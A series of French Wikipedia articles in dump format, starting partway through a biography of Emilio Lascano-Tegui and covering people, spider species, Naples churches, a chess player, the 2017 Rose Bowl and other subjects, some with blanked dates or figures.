En 1914, il s’installe à Paris, où il s’adonne à la peinture, écrit des rapports et des essais pour les journaux argentins, se lie avec Apollinaire, Picasso, Modigliani, Cocteau, Marie Vassilieff, Kisling, Kiki, Foujita, Zadkine… et finit par étudier la technologie dentaire, pour travailler à plein temps comme dentiste. 
En 1923, il entre au service diplomatique de son pays, devenant chancelier de deuxième classe sur la recommandation de Marcelo T. de Alvear. Il quitte la France en 1936 pour devenir consul à Caracas, puis à Los Angeles en 1940.
De retour en Argentine en 1944, il écrit dans un magazine de bande dessinée et adhère au Proa - un groupe d’écrivains argentins.
Il vécut ses dernières années à Buenos Aires, où il est mort le 23 avril 1966, en laissant de nombreux articles et une douzaine de livres, qui ont été salués pour leur modernisme. 
Les informations peu nombreuses et contradictoires qu’il aimait à donner de lui-même, les nombreux métiers qu’il a déclaré avoir occupé tout au long de sa vie (conservateur de musée, peintre, décorateur, mécanicien, rentier, brocanteur, dentiste...) rendent obscur le parcours d'Emilio Lascano-Tegui, mais les travaux des écrivains et traducteurs et (1957-2014), ont contribué à faire connaitre cette figure excentrique du panthéon littéraire argentin.

</doc>
<doc id="10578937" url="https://fr.wikipedia.org/wiki?curid=10578937" title="Jean-Sébastien-Eugène Julia de Fontenelle">
Jean-Sébastien-Eugène Julia de Fontenelle

Jean-Sébastien-Eugène Julia de Fontenelle est un pharmacien, chimiste et vulgarisateur scientifique français, né le à Narbonne et mort le . 
Biographie.
Diplômé à Montpellier, il se rend à Barcelone en 1820 pour étudier l'épidémie de fièvre jaune qui y régnait, et est nommé en 1823 médecin en chef de l'hôpital de convalescence de Catalogne. Il est l'un des fondateurs du "Journal de Pharmacie" et de la "Société des Sciences physiques".
Œuvres.
Il est l'auteur d'un grand nombre de "Manuels" pour la collection Roret à partir de 1826 : 
S'y ajoutent : "Manuel de Chimie", — "de Physique", — "de Pharmacie", — "des Eaux minérales", — "du Verrier", — "du Moutardier", — "du Vinaigrier", etc.
Il a également écrit des articles de 1827 à 1831 dans la revue "Bibliothèque physico-économique instructive et amusante".

</doc>
<doc id="10578939" url="https://fr.wikipedia.org/wiki?curid=10578939" title="Ian Maclaren (acteur)">
Ian Maclaren (acteur)

Sydney Shaw — né le à Lynmouth (Angleterre) et mort le à Los Angeles (quartier de Woodland Hills, Californie) — est un acteur anglais, connu sous le nom de scène de Ian Maclaren (parfois crédité Ian MacLaren ou Ian McLaren).
Biographie.
Après des débuts au théâtre dans son pays natal, Ian Maclaren s'installe aux États-Unis et joue ainsi à Broadway (New York) entre 1911 et 1941, dans des pièces principalement.
Parmi elles, mentionnons "Le Songe d'une nuit d'été" de William Shakespeare (1915, avec Isabel Jeans et Ernest Cossart, puis 1932, avec Charles Dingle), ainsi que "Sainte Jeanne" de George Bernard Shaw (1923-1924, avec Morris Carnovsky et Henry Travers).
Toujours à Broadway, s'ajoutent trois revues, dont "Ziegfeld Follies of 1913" (1913, avec Leon Errol).
Au cinéma (majoritairement américain, plus quelques films britanniques ou en coproduction), il débute dans trois films muets sortis en 1923 et 1924, dont "Monsieur Beaucaire" de Sidney Olcott (1924, avec Rudolph Valentino et Bebe Daniels).
Suivent trente films parlants, le premier étant "La Fin du voyage" de James Whale (coproduction américano-britannique, 1930, avec Colin Clive et David Manners). Puis il apparaît notamment dans "Cléopâtre" de Cecil B. DeMille (1934, avec Claudette Colbert et Warren William), "Le Prince et le Pauvre" de William Keighley (1937, avec Errol Flynn et Claude Rains) et "Le Chien des Baskerville" de Sidney Lanfield (1939, avec Basil Rathbone et Nigel Bruce).
Ses deux derniers films (britanniques, où il est crédité sous son nom de naissance) sortent respectivement en 1941 et 1947.

</doc>
<doc id="10578946" url="https://fr.wikipedia.org/wiki?curid=10578946" title="Ian MacLaren">
Ian MacLaren



</doc>
<doc id="10578947" url="https://fr.wikipedia.org/wiki?curid=10578947" title="Épine-du-Christ">
Épine-du-Christ

Épine-du-Christ est le nom vernaculaire de plusieurs espèces de plantes à fleurs :

</doc>
<doc id="10578948" url="https://fr.wikipedia.org/wiki?curid=10578948" title="Ian McLaren">
Ian McLaren



</doc>
<doc id="10578949" url="https://fr.wikipedia.org/wiki?curid=10578949" title="South East Asian Airlines">
South East Asian Airlines



</doc>
<doc id="10578963" url="https://fr.wikipedia.org/wiki?curid=10578963" title="Équipe cycliste Color Code-Arden'Beef">
Équipe cycliste Color Code-Arden'Beef



</doc>
<doc id="10578966" url="https://fr.wikipedia.org/wiki?curid=10578966" title="Saison 2017 de l'équipe cycliste AGO-Aqua Service">
Saison 2017 de l'équipe cycliste AGO-Aqua Service

La saison 2017 de l'équipe cycliste AGO-Aqua Service est la sixième de cette équipe.
Bilan de la saison.
Victoires.
Aucune victoire UCI.

</doc>
<doc id="10578973" url="https://fr.wikipedia.org/wiki?curid=10578973" title="Conothele baiyunensis">
Conothele baiyunensis

Conothele baiyunensis est une espèce d'araignées mygalomorphes de la famille des Halonoproctidae.
Distribution.
Cette espèce est endémique du Guangdong en Chine. Elle se rencontre sur le mont Baiyun.
Description.
La femelle holotype mesure .
Étymologie.
Son nom d'espèce, composé de "baiyun" et du suffixe latin "", « qui vit dans, qui habite », lui a été donné en référence au lieu de sa découverte, le mont Baiyun.

</doc>
<doc id="10578974" url="https://fr.wikipedia.org/wiki?curid=10578974" title="Conothele daxinensis">
Conothele daxinensis

Conothele daxinensis est une espèce d'araignées mygalomorphes de la famille des Halonoproctidae.
Distribution.
Cette espèce est endémique du Guangxi en Chine. Elle se rencontre vers Chongzuo.
Description.
La femelle holotype mesure .
Étymologie.
Son nom d'espèce, composé de "daxin" et du suffixe latin "", « qui vit dans, qui habite », lui a été donné en référence au lieu de sa découverte, le xian de Daxin.

</doc>
<doc id="10578977" url="https://fr.wikipedia.org/wiki?curid=10578977" title="Cozad">
Cozad

La ville américaine de est située dans le comté de Dawson, dans l’État du Nebraska. Sa population s’élevait à lors du recensement.

</doc>
<doc id="10578978" url="https://fr.wikipedia.org/wiki?curid=10578978" title="Kreuz im Venn">
Kreuz im Venn



</doc>
<doc id="10578979" url="https://fr.wikipedia.org/wiki?curid=10578979" title="Conothele sidiechongensis">
Conothele sidiechongensis

Conothele sidiechongensis est une espèce d'araignées mygalomorphes de la famille des Halonoproctidae.
Distribution.
Cette espèce se rencontre en Chine au Yunnan et au Laos dans la province d'Oudomxay.
Description.
La femelle holotype mesure .
Étymologie.
Son nom d'espèce, composé de "sidiechong" et du suffixe latin "", « qui vit dans, qui habite », lui a été donné en référence au lieu de sa découverte, Sidiechong.

</doc>
<doc id="10578980" url="https://fr.wikipedia.org/wiki?curid=10578980" title="Ancien Institut pour le traitement des maladies des yeux du docteur Coppez">
Ancien Institut pour le traitement des maladies des yeux du docteur Coppez

L'ancien Institut pour le traitement des maladies des yeux du docteur H. Coppez est un édifice classé de style Art nouveau géométrique édifié à Etterbeek, une commune de Bruxelles en Belgique, par Jean-Baptiste Dewin, un architecte qui s'est fait une spécialité de la construction d'édifices à vocation médicale.
Localisation.
L'ancien Institut pour le traitement des maladies des yeux est situé à Etterbeek, au numéro 68-70 de l'avenue de Tervueren, une artère créée à l'initiative du roi Léopold II à l'occasion de l'Exposition internationale de Bruxelles de 1897, afin de relier les Arcades du Cinquantenaire au Palais des Colonies à Tervuren.
Historique.
C'est en 1912 que Jean-Baptiste Dewin réalise cet immeuble en style Art nouveau.
En 1920, Dewin établit les plans d'un petit bâtiment d'un niveau et d'une annexe situés à l'arrière.
L'édifice a été classé comme monument le sous la référence 2076-0026/0.
À la fin du et au début du , le bâtiment conserve un lien avec le monde médical car il abrite le siège d'une mutualité neutre.
Architecture.
L'institut présente vers l'avenue une façade de trois étages en briques blanches sur soubassement en pierre bleue.
Cette façade comporte trois travées délimitées par de hauts pilastres qui courent sur toute la hauteur de la façade (ordre colossal).

</doc>
<doc id="10578981" url="https://fr.wikipedia.org/wiki?curid=10578981" title="Conothele yundingensis">
Conothele yundingensis

Conothele yundingensis est une espèce d'araignées mygalomorphes de la famille des Halonoproctidae.
Distribution.
Cette espèce est endémique du Yunnan en Chine. Elle se rencontre sur le mont Yunding.
Description.
La femelle holotype mesure .
Étymologie.
Son nom d'espèce, composé de "yunding" et du suffixe latin "", « qui vit dans, qui habite », lui a été donné en référence au lieu de sa découverte, le mont Yunding.

</doc>
<doc id="10578982" url="https://fr.wikipedia.org/wiki?curid=10578982" title="William Henry Wallace">
William Henry Wallace

William Henry Wallace ( - ) est un brigadier général de l'armée des États confédérés lors de la guerre de Sécession (guerre civile). Avant la guerre de Sécession, il est planteur, éditeur d'un journal, avocat et élu de Caroline du Sud, en 1860, qui soutient la convention de l'État appelant à la . Il sert sur le théâtre oriental de la guerre de Sécession, y compris en tant que commandant de brigade dans l'armée de Virginie du Nord. Après la guerre de Sécession, il est avocat, planteur, élu de Caroline du Sud et juge de cour de circuit.
Avant la guerre.
Fils du membre du Congrès , William Henry Wallace naît le dans le comté de Laurens, Caroline du Sud, puis district de Laurens. Il est diplômé du South Carolina College, qui est devenu l'université de Caroline du Sud, en 1849. Avant la guerre de Sécession, il est un planteur, éditeur du journal "Union Times" (Union, en Caroline du Sud), avocat et législateur de Caroline du Sud. En tant que membre de la législature de Caroline du Sud en 1860, Wallace soutient l'État appelant à une convention pour décider de la question de la . Wallace épouse Sarah Smith Dunlap, l'arrière-petite-fille du sénateur américain . Le gendre de Wallace est , gouverneur de Caroline du Sud.
Guerre de Sécession.
Lorsque Wallace termine son mandat à la législature de l'État de Caroline du Sud, il s'engage comme soldat dans le 18th South Carolina Infantry Regiment. Il est rapidement adjudant du régiment et est élu premier lieutenant et capitaine en . En , il est élu lieutenant-colonel. Le régiment est stationné en Caroline du Sud jusqu'en .
Quand le colonel du régiment est tué au cours de la campagne de la deuxième bataille de Bull Run le , Wallace obtient le commandement du régiment, promu colonel à cette date. Il n'est pas officiellement nommé à cette nomination avant le .
Dans la brigade du brigadier général Nathan G. "Shanks" Evans, Wallace commande son régiment à la bataille de South Mountain, et à la bataille d'Antietam. La brigade est envoyée alors défendre Charleston, Caroline du Sud.
Au printemps de 1864, la brigade, alors commandée par le brigadier général est envoyée défendre Petersburg, Virginie. Le 18th South Carolina Infantry tient une partie de la ligne sous laquelle les charges explosives de l'armée de l'Union sont actionnées aboutissant à la bataille du Cratère, le . L'explosion de la mine souffle quatre compagnies du 18th South Carolina Infantry et blesse Elliott.
William Henry Wallace est promu brigadier général, en vertu de la loi confédérée autorisant le président confédéré à nommer vingt brigadiers généraux temporaires le . Elliott est mis hors de combat par l'explosion de la mine, aussi Wallace prend le commandement de son ancienne brigade dans la division du major général Bushrod Johnson du IV corps, jusqu'à la reddition de l'armée de Virginie du Nord, le , à Appomattox Court House, en Virginie. Wallace est libéré sur parole à Appomattox Court House à cette date.
Après la guerre.
Après la guerre de Sécession, Wallace retourne en Caroline du Sud, où il est avocat et planteur. Il est élu à la législature de la Caroline du Sud pendant trois mandats de deux ans commençant avec l'élection de 1872. Wallace est juge de la cour de circuit à partir de 1877 jusqu'à sa retraite en 1893.
William Henry Wallace meurt le , à Union, en Caroline du Sud. Il est enterré dans le cimetière Presbytérien à Union.

</doc>
<doc id="10579000" url="https://fr.wikipedia.org/wiki?curid=10579000" title="Serbie du Sud">
Serbie du Sud

La Serbie du Sud () est une province ("pokrajina") du royaume des Serbes, Croates et Slovènes (Yougoslavie) qui exista entre 1919 et 1922. Il comprenait les territoires modernes du Sandjak (certaines parties de la Serbie et du Monténégro), du Kosovo et de la Macédoine du Nord. Le nom de « Vieille Serbie et Macédoine », ou simplement « Vieille Serbie », a été historiquement utilisé dans la politique, la littérature et la science serbes pour désigner les territoires de la province. Après la dissolution de cette dernière, le terme a continué à être utilisé pour la banovine du Vardar et la banovine de la Zeta.
Histoire.
La province a été créée en 1919, après la création de la Yougoslavie le . La Serbie a considérablement élargi ses frontières pendant les guerres balkaniques. La province a été dissoute en 1922 et ses territoires ont été réorganisés en deux banovines : la banovine du Vardar et la banovine de la Zeta. Le terme a ensuite été familièrement utilisé pour ces territoires.
Économie.
La province de Serbie du Sud étant une région principalement montagneuse, elle a des conditions favorables pour le développement de l'élevage, comme le montrent les statistiques sur l'augmentation du nombre de têtes de bétail. Le nombre d'animaux a dépassé 13 % du nombre total de l'ensemble de la Yougoslavie. La restauration de l'élevage, qui avait été détruit pendant les années de guerre, était le principal objectif du ministère de l'Économie.
Démographie.
En 1921, la province comptait environ 1,7 million d'habitants.

</doc>
<doc id="10579006" url="https://fr.wikipedia.org/wiki?curid=10579006" title="Église San Severo fuori le mura">
Église San Severo fuori le mura

L'église San Severo fuori le mura (Saint-Sever-hors-les-Murs) est une église de Naples donnant sur la piazza San Severo a Capodimonte dans le rione Sanità, d'où l'autre nom de l'église : San Severo alla Sanità. 
Histoire.
&lt;mapframe zoom=16 latitude =40.86084 longitude =14.25157 align=left width=250 height=250 text="Carte interactive de l'église San Severo fuori le mura"&gt;{
 "type": "FeatureCollection",
 "features": [
 "type": "Feature",
 "properties": {
 "stroke": "#555555",
 "stroke-width": 2,
 "stroke-opacity": 1,
 "fill": "#ff6fcf",
 "fill-opacity": 0.5
 "geometry": {
 "type": "Polygon",
 "coordinates": [
 [
 14.251697659492493,
 40.86120082897096
 [
 14.251611828804014,
 40.86067746210153
 [
 14.25149381160736,
 40.86070991908192
 [
 14.251391887664795,
 40.86111562999494
 [
 14.251697659492493,
 40.86120082897096
 ]
 {
 "type": "Feature",
 "properties": {
 "marker-color": "#400080",
 "marker-size": "medium",
 "marker-symbol": "religious-christian"
 "geometry": {
 "type": "Point",
 "coordinates": [
 14.251563549041748,
 40.86086814663359
 ]
}&lt;/mapframe&gt;
À la fin du , l'évêque de Naples, saint Sever (ou "Severus"), est enterré sur ce site. Lorsque sa dépouille est translatée en l'église San Giorgio Maggiore, les fidèles délaissent quelque peu l'endroit des catacombes. Une église est bâtie à proximité en 1573, selon la volonté du cardinal Mario Carafa qui la concède aux frères mineurs conventuels.
Un siècle plus tard en 1680, les frères font entièrement réaménager leur couvent et l'église conventuelle, selon les plans de Dionisio Lazzari.
Œuvres principales.
Un petit tunnel de la troisième chapelle permet d'accéder aux catacombes et il est possible d'en admirer les fresques récemment restaurées avec minutie, au bout de longues années.
De chaque côté du chœur, se trouvent deux tableaux de Paolo de Matteis datant de 1709: "La Visitation" et "Notre-Dame du Rosaire" provenant de l'église du Divin-Amour, aujourd'hui disparue.
Le transept de gauche présente un remarquable bas-relief de marbre figurant "La Vierge à l'Enfant", commandé en 1600 par Camillo Maresca.
La Cappella dei Bianchi accueille l'œuvre "" (le Fils Voilé) du sculpteur Jago. 

</doc>
<doc id="10579011" url="https://fr.wikipedia.org/wiki?curid=10579011" title="Cap Toi">
Cap Toi

Le est un site naturel de la préfecture de Miyazaki au Japon, situé à Kushima sur la côte du Nichinan bordant l’océan Pacifique. Le site est réputé pour sa beauté et pour les chevaux sauvages qui l'arpentent librement. Une bande de terre au cœur du cap Toi comprenant le mont Ōgi et la colline Komatsu, sont classés monument naturel national par l'agence pour les Affaires culturelles. 

</doc>
<doc id="10579017" url="https://fr.wikipedia.org/wiki?curid=10579017" title="Spica (étoile)">
Spica (étoile)



</doc>
<doc id="10579018" url="https://fr.wikipedia.org/wiki?curid=10579018" title="Raffaello Carlo Rossi">
Raffaello Carlo Rossi



</doc>
<doc id="10579026" url="https://fr.wikipedia.org/wiki?curid=10579026" title="Ancien Institut pour le traitement des maladies des yeux du docteur H. Coppez">
Ancien Institut pour le traitement des maladies des yeux du docteur H. Coppez



</doc>
<doc id="10579047" url="https://fr.wikipedia.org/wiki?curid=10579047" title="Tanguy Ringoir">
Tanguy Ringoir

Tanguy Ringoir est un joueur d'échecs belge né le à Wetteren. Grand maître international depuis 2015, il remporte trois fois le championnat de Belgique d'échecs (en 2012, 2013 et 2016). Au , il est le numéro deux belge avec un classement Elo de .
Biographie.
Tanguy Ringoir a poursuivi ses études supérieures aux États-Unis. Il est diplômé de l’UMBC, où il a obtenu un baccalauréat en économie financière ainsi qu’une maîtrise en analyse de la politique économique. Ses recherches doctorales portent sur les effets de la concentration des marchés hospitaliers, avec pour objectif d’évaluer les impacts sur les coûts, la qualité des soins et l’accès aux services de santé.
En plus de ses activités académiques, il est également entraîneur de l’équipe d’échecs de l’UMBC, contribuant au développement stratégique et à la performance des joueurs universitaires.
Doctorat en politiques publiques. 2021-2025.
Parcours échiquéen.
En 2013 Tanguy Ringoir participe aux championnats d'Europe par équipes.
En Belgique, Tanguy Ringoir joue dans les Interclubs entre et pour le , le Vliegend Peerd Bredene, le Koninklijke Brugse Schaakkring, le Cercle d'Échecs Fontainois et . Dans , il a joué au deuxième échiquier pour les "Kingfishers de Baltimore."
En novembre 2023 Tanguy Ringoir participe au Tournoi fermé à norme de GMI sur invitation à Charlotte en Caroline du Nord aux États-Unis du 17 au 21 novembre et termine second ex æquo avec 6/9 (3+ 6= 0-). Il enchaîne immédiatement sur un tournoi Open, l'US masters 2023 réunissant 202 joueurs du 22 au 26/11/2023 , il termine au classement général avec un score de 6,5/9 (4+ 5= 0-).
En août 2024 Tanguy Ringoir participe à la édition annuelle du championnat International de Washington à Rockville, Maryland aux États-Unis du 10 au 14 août réunissant 101 participants et termine à la place avec un score de 6/9 (3+ 6= 0-).
En juillet 2025 Tanguy Ringoir participe au 125ième Championnat d'échecs de l'US Open à Middleton, Wiscosin aux États-Unis du 28 juillet au 3 août réunissant 514 participants et termine au classement général à la 5e place avec 7,5/9 (6+ 3=) 
Olympiades.
Tanguy Ringoir représente la Belgique lors des olympiades de 2012 (6,5 points sur 10 au quatrième échiquier) et 2014 (6,5 points sur 11 au troisième échiquier).

</doc>
<doc id="10579057" url="https://fr.wikipedia.org/wiki?curid=10579057" title="Cyclocosmia liui">
Cyclocosmia liui

Cyclocosmia liui est une espèce d'araignées mygalomorphes de la famille des Halonoproctidae.
Distribution.
Cette espèce est endémique du Guizhou en Chine. Elle se rencontre sur le mont Fanjing.
Description.
La femelle holotype mesure .
Étymologie.
Cette espèce est nommée en l'honneur de Feng-xiang Liu.

</doc>
<doc id="10579068" url="https://fr.wikipedia.org/wiki?curid=10579068" title="FK Altaï Semeï">
FK Altaï Semeï

Le Altaï Semeï Fýtbol Klýby (en ), plus couramment abrégé en Altaï Semeï, est un ancien club kazakh de football fondé en 2016 et disparu en 2017, et basé dans la ville de Semeï.
Il est issu de la fusion en 2016 entre le FK Spartak Semeï et le Vostok Öskemen.
Histoire.
L'histoire du club débute en 2016, en seconde division kazakhe où il ne restera qu'un an, avec une seconde place synonyme de promotion en première division pour la saison 2017.
Sa promotion est cependant annulée par la fédération kazakhe qui refuse d'octroyer une licence au club. Ne parvenant pas non plus à obtenir de licence de deuxième division, le club est finalement dissous au début du mois d'avril 2017 après une seule année d'existence.

</doc>
<doc id="10579069" url="https://fr.wikipedia.org/wiki?curid=10579069" title="Observatoire Pic Terskol">
Observatoire Pic Terskol

Lobservatoire international Pic Terskol est un observatoire astronomique, situé sur le pic Terskol au nord du village de Terskol, dans la république de Kabardino-Balkarie (Caucase russe). Fondé en 1980 par l'Académie nationale des sciences d'Ukraine, il est situé à du sommet du mont Elbrouz, à une altitude de . Depuis le , l'observatoire est exploité conjointement par l'Académie nationale des sciences d'Ukraine, Terskolskim une partie de l'Observatoire astronomique d'Odessa et le Centre international de la recherche astronomique et médicale et environnementale. 
Il est situé à proximité de l'.

</doc>
<doc id="10579096" url="https://fr.wikipedia.org/wiki?curid=10579096" title="Alexandre Falcoz de La Blâche">
Alexandre Falcoz de La Blâche



</doc>
<doc id="10579104" url="https://fr.wikipedia.org/wiki?curid=10579104" title="Clément Vismara">
Clément Vismara

Clément Vismara, né le à Agrate Brianza et décédé le à Mong Ping, est un prêtre catholique italien de l'Institut pontifical pour les missions étrangères, missionnaire en Birmanie. Il est connu pour son œuvre missionnaire et caritative auprès des populations indigènes birmanes. Il est vénéré comme bienheureux par l'Église catholique.
Biographie.
Clément Vismara est né à Agrate Brianza dans une famille modeste et religieuse. Dans sa jeunesse, il est confronté au décès de ses parents à quelques années d'intervalles. Appelé par la vie religieuse, c'est pendant la Première Guerre mondiale qu'il intègre l'Institut pontifical pour les missions étrangères à Milan. Il est ordonné prêtre le . 
Peu après son ordination, ses supérieurs l'envoient en Birmanie. Ayant débarqué à Taungû, c'est là qu'il apprend l'anglais et les dialectes locaux. Très souvent, les jeunes missionnaires mourraient prématurément à cause des maladies tropicales et c'est dans cet environnement primitif et inconnu que Clément Vismara se lance dans son ministère. Il concentre son apostolat auprès des tribus indigènes dans les forêts birmanes. 
Pendant ses soixante-cinq années d'œuvre missionnaire, il construit de nombreuses églises, des écoles, des dispensaires et des hôpitaux. Par ailleurs, il introduit de nouvelles techniques d’agriculture et d’irrigation. De plus, il forme des éleveurs, des maçons, des barbiers, des bûcherons, pour entretenir les forêts. Malgré le manque de moyens, il parvient à créer des lieux d’accueil pour les lépreux et les orphelins. Clément Vismara suscite l'admiration de la population par son style de vie austère et dénué de tout et par sa grande piété. 
Il meurt à Mong Ping le , âgé de 91 ans. Malgré les différences culturelles et religieuses, des centaines de personnes assistèrent à ses funérailles, le reconnaissant comme une "grande âme".
Béatification.
Le , la Congrégation pour les causes des saints autorise l'archidiocèse de Milan à introduire la cause en béatification et canonisation de Clément Vismara. L'enquête diocésaine se clôture le et elle est transférée à Rome pour être étudiée par le Saint-Siège. 
Le , le pape Benoît XVI reconnaît l'héroïcité de ses vertus et le déclare vénérable.
Le , le pape signe le décret de béatification. La cérémonie est célébrée le à Milan par le cardinal Angelo Amato.
La mémoire liturgique fixée au 15 juin.

</doc>
<doc id="10579111" url="https://fr.wikipedia.org/wiki?curid=10579111" title="Air Philippines">
Air Philippines



</doc>
<doc id="10579113" url="https://fr.wikipedia.org/wiki?curid=10579113" title="Slade Alive!">
Slade Alive!

 est le premier album live du groupe de hard rock et de glam rock britannique Slade. Il est sorti en 1972 sur le label Polydor.
Produit par Chas Chandler et enregistré au Command Theatre Studio
 pour 600 livres sterling seulement, l'album est un mélange de morceaux originaux de Slade et de reprises, comme le classique de Steppenwolf, "Born to Be Wild", ou encore "Get Down And Get With It", le showstopper de l'album.
Il permet au groupe d'entrer pour la première fois dans le classement des meilleures ventes britanniques : il y entre en et y reste durant cinquante-huit semaines, culminant en deuxième position.

</doc>
<doc id="10579120" url="https://fr.wikipedia.org/wiki?curid=10579120" title="Église Santa Maria della Lettera">
Église Santa Maria della Lettera

L'église Santa Maria della Lettera (Sainte-Marie-de-la-Lettre) est une église baroque du centre historique de Naples située dans les Quartiers Espagnols bâtis au . Elle est contiguë à l'église Santi Francesco e Matteo.
Histoire.
L'église est bâtie à l'initiative de Jeanne d'Autriche, fille naturelle de don Juan d'Autriche, le vainqueur de Lépante. Elle en fait don aux Pères théatins, ainsi que l'établissement attenant servant de maison de convalescence. Sa fille Marguerite, duchesse de Tagliacozzo, née Branciforte, la fait remanier en 1646, prenant son aspect actuel.
Quelques retouches ont lieu après le tremblement de terre de 1732. La décoration de stuc de 1735, dans la nef, est l'œuvre d'Andrea Tramontano.
En 1824, le couvent est transformé en habitations privées.
Description.
La façade de l'église est sévère et compacte. Elle présente un portail simple surmonté d'un bas-relief représentant "La Sainte Vierge" en buste, et plus haut d'une loggia architravée de goût classique, fermée par un fronton.
Près du palais du à proximité de l'église, on remarque un petit édicule sacré d'époque baroque, commandé par la confrérie de Sainte-Marie-de-la-Lettre dans les premières années du .

</doc>
<doc id="10579124" url="https://fr.wikipedia.org/wiki?curid=10579124" title="João Doria Júnior">
João Doria Júnior



</doc>
<doc id="10579125" url="https://fr.wikipedia.org/wiki?curid=10579125" title="Louis Benedictus">
Louis Benedictus

Louis Benedictus (né Ludwig le à Vienne, mort le à Dinard) est un pianiste et compositeur français.
Biographie.
Fils de parents juifs hollandais, frère de Édouard Bénédictus, il étudie avec Franz Liszt en Autriche puis avec Henry Litolff et Alexis Chauvet en France. Il organise six sessions Wagner en 1882 à la salle Nadar de Paris. En 1889 et 1900, il contribue à l'édition de "Musiques bizarres" lors des expositions universelles de 1890 et de 1900. Parmi ses œuvres :

</doc>
<doc id="10579130" url="https://fr.wikipedia.org/wiki?curid=10579130" title="Maison d'Espinay Saint-Luc">
Maison d'Espinay Saint-Luc



</doc>
<doc id="10579140" url="https://fr.wikipedia.org/wiki?curid=10579140" title="Église Saint-Nicolas de Coullemelle">
Église Saint-Nicolas de Coullemelle

L'église Saint-Nicolas de Coulemelle est située dans le village de Coullemelle dans le département de la Somme à environ 30 km au sud d'Amiens.
Historique.
L’église Saint-Nicolas a été construite après la Première Guerre mondiale sur les ruines de l’ancienne église détruite en 1918 par l’artillerie allemande. Le gros œuvre a été consacré par Lecomte, évêque d'Amiens, en 1927. L'édifice est protégé au titre des monuments historiques : inscription par arrêté du .
Caractéristiques.
Extérieur.
L'église a été reconstruite de 1924 à 1927 sur les plans des architectes Théodule Morel et Robert Petit, en moellons du Boulonnais. Le décor sculpté néo-roman du tympan du portail occidental et les modillons ont été réalisés en pierre de la vallée de l'Oise .
La sculpture du tympan représentant le tétramorphe est l'œuvre d'Anne-Marie Roux-Colas. Les voussures de tores sont cernées de cavets ou ornées de billettes rayonnantes. Les archivoltes sont également ornées de billettes.
Intérieur.
L’intérieur se caractérise par son décor de style Art déco réalisé par les architectes-décorateurs Pierre Ansart et son fils, Gérard Ansart, qui ont conçu : autels, sculptures, fresque en sgraffite avec incrustation de mosaïques du chemin de croix réalisée par Jean Gaudin, mosaïque de saint Nicolas au fond de l’abside, vitraux, mobilier et ferronneries...
Les vitraux dessinés par le Révérend Père Bernadin Fernique et Gérard Ansart ont été réalisés par Pierre Turpin.
Georges Legrand, Marceau Darras, Anne-Marie Roux-Colas et Roger de Villiers ont réalisé les sculptures.
Deux bâtons de procession en bois doré sont inscrits monuments historiques au titre d'objet depuis le 29 septembre 1980.

</doc>
<doc id="10579143" url="https://fr.wikipedia.org/wiki?curid=10579143" title="Raïon de l'Elbrouz">
Raïon de l'Elbrouz

Le raïon de l'Elbrouz (en ; en kabarde : Ӏуащхьэмахуэ къедзыгъуэ, en ) est un raïon (district) administratif et municipal, de la république de Kabardino-Balkarie, dans la Caucase, au sud-ouest de la Russie. Il est situé à l'ouest et au sud-ouest de la république. Le territoire du raïon d'Elbrouz couvre une superficie de . Son centre administratif est la ville de Tyrnyaouz. Selon le recensement de 2010, la population du raïon était de , dont 57,9% vivaient à Tyrnyaouz.

</doc>
<doc id="10579147" url="https://fr.wikipedia.org/wiki?curid=10579147" title="Parcs nationaux d'Estonie">
Parcs nationaux d'Estonie

Les parcs nationaux d'Estonie sont un ensemble de six parcs nationaux situés en Estonie. Le premier parc, le parc national de Lahemaa est établi en 1971, et est donc le premier parc national de toute l'URSS.

</doc>
<doc id="10579151" url="https://fr.wikipedia.org/wiki?curid=10579151" title="Rose Bowl 2017">
Rose Bowl 2017

Le Rose Bowl 2017 est un match de football américain de niveau universitaire joué après la saison régulière de 2016, le , au Rose Bowl de Pasadena en Californie. 
Il s'agit de la édition du Rose Bowl.
Le match met en présence, comme lors des éditions de 1923 et 2009, les équipes des Trojans d'USC issue de la Pacific-12 Conference et des Nittany Lions de Penn State issue de la Big Ten Conference.
Il a débuté à  locales et est retransmis en télévision sur ESPN et en radio sur ESPN Radio et XM Satellite Radio.
Sponsorisé par la société "Northwestern Mutual", le match est officiellement dénommé le 2017 Rose Bowl presented by Northwestern Mutual.
USC gagne le match sur le score de 52 à 49.
L'édition du Rose Bowl 2017 est celle au cours de laquelle il aura été inscrit le plus grand nombre de points ( au total des deux équipes) de toute l'histoire du Rose Bowl. Elle bat le record du Rose Bowl de 2012 qui était de .
Présentation du match.
Le match met en présence les équipes les mieux classées des conférences Pacific 12 et Big 10 qui n'ont pas été sélectionnées pour les demi-finales du College Football Playoff. Les équipes sont officiellement invitées par l'Association du "Pasadena Tournament of Roses" le . Cette sélection est basée sur le dernier classement de la saison 2016 publié par le comité du College Football Playoff. 
Il s'agit de la rencontre entre ces deux équipes, la dernière ayant eu lieu à l'occasion du Rose Bowl 2009 (victoire de USC 38-24). USC a remporté 5 des 9 rencontres.
Trojans d'USC.
Avec un bilan global en saison régulière de 9 victoires et 3 défaites, USC est éligible et accepte l'invitation pour participer au Rose Bowl de 2017.
Ils terminent de la South Division de la Pacific-12 Conference derrière  Colorado, avec un bilan en division de 7 victoires et 2 défaites.
À l'issue de la saison régulière 2016 ("bowl" non compris), ils seront classés aux classements CFP, AP et Coasches.
À l'issue de la saison 2016 ("bowl" compris), ils seront classés au classement AP et au classement Coaches, le classement CFP n'étant pas republié après les bowls.
Il s'agit de leur participation au Rose Bowl, dont 24 victoires et 9 défaites. Leur dernière apparition remonte à la saison 2008 (victoire le , 38 à 24 contre Penn State).
Nittany Lions de Penn State.
Avec un bilan global en saison régulière de 11 victoires et 2 défaites, Penn State est éligible et accepte l'invitation pour participer au Rose Bowl de 2017.
Ils terminent de la East Division de la Conference Big 10 avec un bilan en division de 8 victoires et 1 défaites.
À l'issue de la saison 2016 ("bowl" non compris), ils seront classés aux classements CFP, AP et Coaches. 
À l'issue de la saison 2016 ("bowl" compris), ils seront classés aux classements AP et Coaches, le classement CFP n'étant pas republié après les bowls.
Il s'agit de leur participation au Rose Bowl dont 1 victoire et 2 défaites. Leur dernière apparition date de la saison 2008 (défaite contre USC, 38 à 24 le ).
Résumé du match.
Début du match à pour une durée de .
Température de (), vent d'est-sud-est et de (), ciel nuageux.

</doc>
<doc id="10579153" url="https://fr.wikipedia.org/wiki?curid=10579153" title="Parlement de la Gambie">
Parlement de la Gambie



</doc>
<doc id="10579154" url="https://fr.wikipedia.org/wiki?curid=10579154" title="Parlement gambien">
Parlement gambien



</doc>
